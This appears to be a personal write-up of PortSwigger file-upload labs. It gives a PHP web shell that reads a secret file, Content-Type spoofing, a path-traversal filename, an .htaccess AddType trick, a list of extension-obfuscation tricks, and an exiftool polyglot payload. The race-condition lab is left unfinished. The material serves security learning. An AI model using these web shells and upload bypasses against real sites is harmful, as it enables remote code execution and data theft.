---
title: File Upload practice PortSwigger Labs
date: 2023-1-25 00:18:00 +0800
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [Web Hacking]
---

## Lab: Remote code execution via web shell upload
```php
 we put the following code inside a .php file
<?php echo file_get_contents('/home/carlos/secret'); ?>
// We upload it, and then access it via /files/avatars/shell.php 
```

## Lab: Web shell upload via Content-Type restriction bypass
```php
// The page blocks all files that are not image/jpeg type, so we upload the .php file, intercept the request with burpsuite and change the 
Content-Type: application/x-php 
// to
Content-Type: image/jpeg
```

## Lab: Web shell upload via path traversal
```php
// We can upload the file, but it does not interpret the command, but returns it to us on the screen. Therefore, we are going to upload the file applying an obfuscated path traversal: we change the field filename="shell.php" by filename="..%2fshell.php" and we can already access the file in /files/shell.php
```

## Lab: Web shell upload via extension blacklist bypass
```php
// As we can see, it is not possible to upload .php files, so we are going to modify the internal configuration of the server to accept this file in .shell format. As we know that we are in front of an Apache (since when uploading an image for example, the response of the request indicates it to us), we are going to modify its configuration so that it accepts .shell files (php) For it, we intercept the request and we make the following changes:
// - we change the filename to filename=".htaccess" --> To modify the types of files accepted by the machine directory /files/avatars. This way, we can upload .php
// -change the to "Content-Type text/plain" --> It is necessary to be able to upload .htaccess files.
// -change the Payload of the .php to "AddType application/x-httpd-php .shell" --> The .shell files we upload will be interpreted as .php files

// Once we have made the following changes, we go back to the original request and upload the shell.shell file (originally named shell.php) and if we go to /files/avatars/shell.shell we can see the password to fix the lab. 
```

## Lab: Web shell upload via obfuscated file extension
```shell
# We try to obfuscate the .php file as PNG using the null byte: shell.php%00.png and we can access it.
 Other ways to obfuscate: 
- Add white-listed extension: exploit.php.jpg
- Add endpoint to the file: exploit.php.
- URL-Encode the dot: exploit%2Ephp
- Add ; at the end: exploit.php;.png
- Null byte: exploit.php%00.png
- Use other alternatives to the URL-encoder of the point: xC0 x2E, xC4 xAE, xC0, xAE
- Strip bypass -> if uploading the .php file deletes the php extension, we can try the following: exploit.p.phphp -> deletes .php -> remains: exploit.php
```

## Lab: Remote code execution via polyglot web shell upload
```shell
 We see that we can only upload files of type image, which in their metadata contain code indicating that it is a .png
 Therefore, let's use ExifTool to camouflage code inside an image:
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <our-file>.png -o polyglot.php
# Once we have it, we upload the image and access its directory from the web page.
```

## Lab: Web shell upload via race condition
```shell
#To be done
```


